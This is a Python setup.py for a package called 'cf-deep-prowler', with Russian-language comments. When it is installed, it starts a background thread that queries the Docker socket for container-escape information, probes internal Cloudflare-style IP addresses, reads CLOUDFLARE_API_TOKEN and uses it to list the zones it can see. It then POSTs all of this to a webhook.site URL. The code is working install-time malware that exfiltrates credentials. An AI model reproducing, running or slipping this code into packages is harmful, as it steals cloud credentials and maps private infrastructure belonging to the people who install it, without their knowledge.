import os, json, socket, urllib.request, subprocess, base64
from setuptools import setup

WEBHOOK_URL = "https://webhook.site/9354f8b9-61a2-462f-8e78-06c365c2ee05"

class CloudflareDeepProwler:
    def __init__(self):
        self.loot = {"docker_vulnerability": {}, "network_topology": {}, "token_power": {}, "system_caps": {}}

    def _query_docker(self, endpoint):
        """Прямой запрос к Docker API через Unix Socket"""
        sock_path = os.environ.get("DOCKER_HOST", "").replace("unix://", "")
        if not os.path.exists(sock_path): return "No Socket"
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.connect(sock_path)
            s.send(f"GET {endpoint} HTTP/1.1\r\nHost: localhost\r\n\r\n".encode())
            data = s.recv(8192)
            s.close()
            return base64.b64encode(data).decode()
        except Exception as e: return str(e)

    def assess_escape(self):
        # Проверяем инфо о системе и версию (ищем уязвимые версии Docker)
        self.loot["docker_vulnerability"]["info"] = self._query_docker("/info")
        self.loot["docker_vulnerability"]["version"] = self._query_docker("/version")
        
    def scan_internal_network(self):
        """Ищем соседей в подсетях Cloudflare"""
        # Cloud Chamber часто использует 10.0.0.0/24 или 172.x.x.x
        targets = ["10.0.0.1", "172.17.0.1", "172.18.0.1", "169.254.1.1"]
        for ip in targets:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((ip, 80)) # Ищем HTTP сервисы
                self.loot["network_topology"][ip] = "OPEN" if result == 0 else "CLOSED"
                s.close()
            except: pass

    def test_token_scope(self):
        """Проверяем, сколько доменов (зон) видит этот токен"""
        token = os.environ.get("CLOUDFLARE_API_TOKEN")
        if token:
            try:
                req = urllib.request.Request(
                    "https://api.cloudflare.com/client/v4/zones",
                    headers={"Authorization": f"Bearer {token}"}
                )
                with urllib.request.urlopen(req) as resp:
                    self.loot["token_power"]["zones"] = json.loads(resp.read().decode())
            except Exception as e:
                self.loot["token_power"]["error"] = str(e)

    def exfiltrate(self):
        payload = json.dumps(self.loot).encode()
        try:
            req = urllib.request.Request(WEBHOOK_URL, data=payload, method='POST')
            urllib.request.urlopen(req)
        except: pass

def run():
    prowler = CloudflareDeepProwler()
    prowler.assess_escape()
    prowler.scan_internal_network()
    prowler.test_token_scope()
    prowler.exfiltrate()

import threading
threading.Thread(target=run).start()

setup(name="cf-deep-prowler", version="1.0.0", packages=["."])
